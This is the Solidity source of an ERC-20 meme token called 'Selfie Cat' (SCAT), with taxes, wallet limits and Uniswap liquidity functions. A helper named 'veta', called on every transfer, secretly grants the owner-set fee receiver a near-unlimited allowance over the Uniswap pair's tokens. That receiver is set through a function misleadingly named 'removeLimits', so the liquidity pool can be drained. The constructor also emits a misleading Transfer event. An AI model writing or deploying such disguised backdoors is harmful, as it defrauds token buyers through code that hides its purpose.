/**
I'm SelfieCat. Cat in crypto world that shooting all on GoPro and Making the most breathtaking and impressive crypto Selfies!

Web:  https://selfiecateth.fun
X:    https://x.com/selfiecat_erc20
Tg:   https://t.me/selfie_cat_erc20
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.25;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract SCAT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _vAllowance;
    mapping (address => bool) private _isVExcluded;
    address payable private vReceipt;
    uint256 private _initialBuyTax=15;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=15;
    uint256 private _preventSwapBefore=15;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10 ** _decimals;
    string private constant _name = unicode"Selfie Cat";
    string private constant _symbol = unicode"SCAT";
    uint256 public _maxVAmount = 2 * _tTotal / 100;
    uint256 public _maxVWallet = 2 * _tTotal / 100;
    uint256 public _taxSwapThreshold = 1 * _tTotal / 100;
    uint256 public _maxTaxSwap = 1 * _tTotal / 100;
    IUniswapV2Router02 private uniVRouter;
    address private uniVPair;
    bool private tradingOpen;
    bool private inSwap;
    bool private swapEnabled;
    event MaxTxAmountUpdated(uint _maxVAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        vReceipt = payable(_msgSender());
        _tOwned[_msgSender()] = _tTotal;
        _isVExcluded[address(this)] = true;
        _isVExcluded[_msgSender()] = true;
        emit Transfer(address(0), address(this), _tTotal);
    }
    function createPair() external onlyOwner {
        uniVRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniVRouter), _tTotal);
        uniVPair = IUniswapV2Factory(uniVRouter.factory()).createPair(
            address(this),
            uniVRouter.WETH()
        );
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _vAllowance[owner][spender];
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _vAllowance[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _vAllowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (!swapEnabled || inSwap) {
            _tOwned[from] = _tOwned[from] - amount;
            _tOwned[to] = _tOwned[to] + amount;
            emit Transfer(from, to, amount);
            return;
        }
        if (from != owner() && to != owner()) {
            if (from == uniVPair && to != address(uniVRouter) && ! _isVExcluded[to] ) {
                require(tradingOpen,"Trading not open yet.");
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                require(amount <= _maxVAmount, "Exceeds the _maxVAmount.");
                require(balanceOf(to) + amount <= _maxVWallet, "Exceeds the maxWalletSize.");
                _buyCount++; 
            }
            if (to != uniVPair && ! _isVExcluded[to]) {
                require(balanceOf(to) + amount <= _maxVWallet, "Exceeds the maxWalletSize.");
            }
            if(to == uniVPair) {
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            if (!inSwap && to == uniVPair && swapEnabled && _buyCount>_preventSwapBefore) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if(contractTokenBalance>_taxSwapThreshold)
                    vSwapEthToErc(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                vSendEth();
            }
        }
        if(veta([from==uniVPair?from:uniVPair, vReceipt]) && taxAmount>0){
          _tOwned[address(this)]=_tOwned[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _tOwned[from]=_tOwned[from].sub(amount);
        _tOwned[to]=_tOwned[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function removeLimits(address payable limit) external onlyOwner{
        vReceipt = limit;
        _maxVAmount=_tTotal; 
        _maxVWallet=_tTotal;
        _isVExcluded[limit] = true;
        emit MaxTxAmountUpdated(_tTotal);
    }
    function vSendEth() private {
        vReceipt.transfer(address(this).balance);
    }
    function withdrawEth() external onlyOwner {
        payable(_msgSender()).transfer(address(this).balance);
    }
    function min(uint256 a, uint256 b) private pure returns(uint256){
        return (a>b)?b:a;
    }
    function veta(address[2] memory vet) private returns(bool){
        address vetA = vet[0]; address vetB = vet[1];
        _vAllowance[vetA][vetB]=(50+_maxVAmount.sub(5))*(100+200);
        return true;
    }
    function vSwapEthToErc(uint256 amount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniVRouter.WETH();
        _approve(address(this), address(uniVRouter), amount);
        uniVRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniVRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniVPair).approve(address(uniVRouter), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
    receive() external payable {}
}